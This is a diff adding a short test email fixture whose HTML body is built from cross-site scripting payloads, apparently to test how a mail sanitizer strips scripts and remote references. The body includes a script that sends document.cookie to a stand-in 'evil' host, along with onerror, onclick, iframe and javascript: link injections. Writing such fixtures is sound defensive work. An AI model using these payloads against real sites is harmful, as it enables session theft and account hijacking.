@@ -1,0 +1,7 @@
+Message-ID: <xss-01@example.com>
+From: xss@example.com
+Subject: HTML with scripts and remote refs
+Date: Tue, 30 Sep 2026 14:00:00 +0000
+Content-Type: text/html
+
+<html><body><script>fetch('http://evil/?c='+document.cookie)</script><p onclick="x()">hello</p><img src=x onerror=alert(1) alt=safealt><iframe src=//evil></iframe><link rel=stylesheet href=http://evil/s.css><a href=javascript:alert(1)>j</a><a href=https://ok.example/>ok</a><img src=cid:inline1><style>body{}</style></body></html>
